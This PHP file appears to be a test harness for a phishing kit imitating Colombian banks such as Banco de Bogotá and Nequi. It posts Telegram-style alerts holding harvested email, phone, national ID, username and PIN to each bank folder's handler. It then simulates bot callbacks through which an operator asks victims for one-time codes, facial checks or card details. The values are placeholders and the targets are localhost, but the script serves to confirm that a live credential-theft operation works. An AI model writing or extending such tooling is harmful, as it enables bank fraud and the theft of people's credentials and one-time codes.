<?php
// test_banks.php - Test each bank folder

$banks = ['b-34f1', 'b-34f13', 'b-34f2', 'b-34f10', 'b-34f4', 'b-34f14', 'b-34f5', 'b-34f6', 'b-34f7', 'b-34f01', 'b-34f18', 'b-34f16', 'b-34f0', 'b-34f9', 'b-34f12', 'b-34f02', 'nequi-1'];

$actions = ['pedir_dinamica', 'error_logo', 'error_tc', 'facial', 'confirm_finalizar'];

foreach ($banks as $bank) {
    echo "=== Testing $bank ===\n";

    $message = "
<b><u>💎BANCO DE BOGOTA 💎</u></b>
• <b>💌Correo:</b> test@example.com
• <b>📞Celular:</b> 3001234567
• <b>💸Cedula:</b> 1234567890
• <b>👤Persona:</b> Test User
• <b>🏦Banco:</b> BANCO DE BOGOTA
------------------------------
• <b>📟Dispositivo:</b> PC
• <b>🗺IP:</b> 127.0.0.1
• <b>⏱Hora:</b> " . date('d/m/Y H:i:s') . "
------------------------------
• <b>👤 Usuario:</b> 1234567890
• <b>🔑 Clave:</b> 1234
------------------------------";

    $transactionId = "test_{$bank}_" . time();

    $formData = http_build_query([
        'message' => $message,
        'transactionId' => $transactionId
    ]);

    $context = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => $formData
        ]
    ]);

    $url = "http://localhost:8000/$bank/procesar_logo.php";
    $response = file_get_contents($url, false, $context);

    echo "Send response: $response\n";

    foreach ($actions as $action) {
        echo "--- Testing action: $action ---\n";

        // Simulate click
        $update = [
            'callback_query' => [
                'id' => 'test_cb_' . time() . '_' . $action,
                'from' => ['id' => 123, 'username' => 'testuser'],
                'data' => $action . ':' . $transactionId,
                'message' => [
                    'message_id' => 100,
                    'chat' => ['id' => -5238438739],
                    'text' => $message
                ]
            ]
        ];

        $jsonUpdate = json_encode($update);
        $context2 = stream_context_create([
            'http' => [
                'method' => 'POST',
                'header' => 'Content-Type: application/json',
                'content' => $jsonUpdate
            ]
        ]);

        $url2 = "http://localhost:8000/$bank/webhook.php";
        $response2 = file_get_contents($url2, false, $context2);
        echo "Webhook response: $response2\n";

        // Check response
        $formData3 = http_build_query([
            'transactionId' => $transactionId,
            'messageId' => '100'
        ]);

        $context3 = stream_context_create([
            'http' => [
                'method' => 'POST',
                'header' => 'Content-Type: application/x-www-form-urlencoded',
                'content' => $formData3
            ]
        ]);

        $url3 = "http://localhost:8000/$bank/verificar_respuesta.php";
        $response3 = file_get_contents($url3, false, $context3);
        echo "Verify response: $response3\n";
    }

    echo "\n";
}
?>